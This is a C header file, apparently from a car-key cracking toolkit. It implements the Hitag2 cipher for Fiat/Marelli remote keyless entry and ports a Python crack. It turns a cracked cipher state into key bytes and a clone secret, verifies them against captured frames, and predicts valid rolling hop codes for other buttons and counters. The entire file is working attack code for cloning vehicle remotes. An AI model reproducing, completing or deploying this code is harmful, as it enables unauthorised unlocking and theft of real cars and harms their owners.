// Fiat/Marelli Hitag2 bridge: map an h2crack post-init state (hitag convention)
// to the Fiat clone secret, and verify it against the other captured frames.
// Ported verbatim from keeloq-crack/fiat_v1_crack.py (brev48 + unwind_init + predict_hop).
#ifndef FIAT_BRIDGE_H
#define FIAT_BRIDGE_H
#include <stdint.h>
#ifdef FB_PRINT_STATE
#include <stdio.h>
#endif

#define FB_M48 ((1ULL << 48) - 1)

static inline uint64_t fb_brev48(uint64_t x) {
    uint64_t r = 0;
    for (int i = 0; i < 48; i++) r = (r << 1) | ((x >> i) & 1);
    return r;
}

static inline int fb_par(unsigned v) { v ^= v >> 4; v ^= v >> 2; v ^= v >> 1; return v & 1; }

static inline int fb_filt(uint64_t st) {
    unsigned b0 = (st >> 40) & 0xFF, b1 = (st >> 32) & 0xFF, b2 = (st >> 24) & 0xFF,
             b3 = (st >> 16) & 0xFF, b4 = (st >> 8) & 0xFF, b5 = st & 0xFF;
    int g = ((0x2c79 >> ((((b0 >> 1) & 1) << 3) | (((b0 >> 2) & 1) << 2) | (((b0 >> 4) & 1) << 1) | ((b0 >> 5) & 1))) & 1)
          | (((0x6671 >> (((b1 & 1) << 3) | (((b1 >> 1) & 1) << 2) | (((b1 >> 3) & 1) << 1) | ((b1 >> 7) & 1))) & 1) << 1)
          | (((0x6671 >> ((((b3 >> 5) & 1) << 3) | ((b2 & 1) << 2) | (((b2 >> 2) & 1) << 1) | ((b2 >> 6) & 1))) & 1) << 2)
          | (((0x6671 >> ((((b4 >> 6) & 1) << 3) | ((b3 & 1) << 2) | (((b3 >> 2) & 1) << 1) | ((b3 >> 3) & 1))) & 1) << 3)
          | (((0x2c79 >> ((((b5 >> 1) & 1) << 3) | (((b5 >> 3) & 1) << 2) | (((b5 >> 4) & 1) << 1) | ((b4 >> 5) & 1))) & 1) << 4);
    return (0x7907287b >> g) & 1;
}

static inline int fb_fbk(uint64_t st) {
    unsigned b0 = (st >> 40) & 0xFF, b1 = (st >> 32) & 0xFF, b2 = (st >> 24) & 0xFF,
             b3 = (st >> 16) & 0xFF, b5 = st & 0xFF;
    return (fb_par(b0 & 0xb3) ^ fb_par(b1 & 0x80) ^ fb_par(b2 & 0x83) ^ fb_par(b3 & 0x22) ^ fb_par(b5 & 0x73)) & 1;
}

static inline uint32_t fb_iv(int button, int control, int epoch) {
    return (((uint32_t)(epoch & 0x3FFFF)) << 14) | (((uint32_t)(control & 0x3FF)) << 4) | (button & 0xF);
}

static inline uint32_t fb_output(uint64_t st) {
    uint32_t a = 0;
    for (int i = 0; i < 32; i++) { a = (a << 1) | fb_filt(st); st = ((st << 1) & FB_M48) | fb_fbk(st); }
    return a;
}

// Forward cipher (for the synthetic self-test only).
static inline uint64_t fb_state_after_init(uint32_t uid, int button, int control, const uint8_t key6[6], int epoch) {
    uint64_t st = ((uint64_t)uid << 16) | ((uint32_t)key6[4] << 8) | key6[5];
    uint64_t key = 0; for (int i = 0; i < 6; i++) key = (key << 8) | key6[i];
    uint32_t iv = fb_iv(button, control, epoch);
    for (int i = 0; i < 32; i++) {
        int inp = ((iv >> (31 - i)) & 1) ^ ((key >> (47 - i)) & 1) ^ fb_filt(st);
        st = ((st << 1) & FB_M48) | inp;
    }
    return st;
}

static inline int fb_unwind_init(uint64_t post, uint32_t uid, int *k4, int *k5, int clone[32]) {
    uint64_t st = post;
    for (int i = 31; i >= 0; i--) {
        int inp = st & 1;
        int uidb = (uid >> (31 - i)) & 1;
        st = (st >> 1) | ((uint64_t)uidb << 47);
        clone[i] = inp ^ fb_filt(st);
    }
    if ((st >> 16) != uid) return 0;
    *k4 = (st >> 8) & 0xFF; *k5 = st & 0xFF;
    return 1;
}

static inline uint32_t fb_predict_hop(uint32_t uid, int k4, int k5, const int clone[32],
                                      uint32_t iv0, int button_b, int control_b) {
    uint32_t iv_b = fb_iv(button_b, control_b, 0);
    uint32_t iv0_low = iv0 & ~(0x3FFFFu << 14);
    uint32_t delta = iv0_low ^ iv_b;
    uint64_t st = ((uint64_t)uid << 16) | ((uint32_t)k4 << 8) | (uint32_t)k5;
    for (int i = 0; i < 32; i++) {
        int eff = clone[i] ^ ((delta >> (31 - i)) & 1);
        st = ((st << 1) & FB_M48) | (eff ^ fb_filt(st));
    }
    return fb_output(st);
}

// Given a candidate post-init state (hitag convention, from h2crack), check it
// against all captured frames. On success fills out[6] = {k4,k5,clone[31..0]} and returns 1.
static inline int fb_check_state(uint32_t uid, uint64_t state_hitag, int n,
                                 const int *btn, const int *ctrl, const uint32_t *hop, uint8_t out[6]) {
    uint64_t s_fiat = fb_brev48(state_hitag);
    int k4, k5, clone[32];
    if (!fb_unwind_init(s_fiat, uid, &k4, &k5, clone)) return 0;
    uint32_t iv0 = fb_iv(btn[0], ctrl[0], 0);
    for (int j = 1; j < n; j++)
        if (fb_predict_hop(uid, k4, k5, clone, iv0, btn[j], ctrl[j]) != hop[j]) return 0;
#ifdef FB_PRINT_STATE
    printf("STATE48=%012llx TARGET=%08X\n", (unsigned long long)state_hitag, (unsigned)hop[0]);
#endif
    uint32_t cl = 0; for (int i = 0; i < 32; i++) cl = (cl << 1) | (clone[i] & 1);
    out[0] = (uint8_t)k4; out[1] = (uint8_t)k5;
    out[2] = (cl >> 24) & 0xFF; out[3] = (cl >> 16) & 0xFF; out[4] = (cl >> 8) & 0xFF; out[5] = cl & 0xFF;
    return 1;
}

#endif
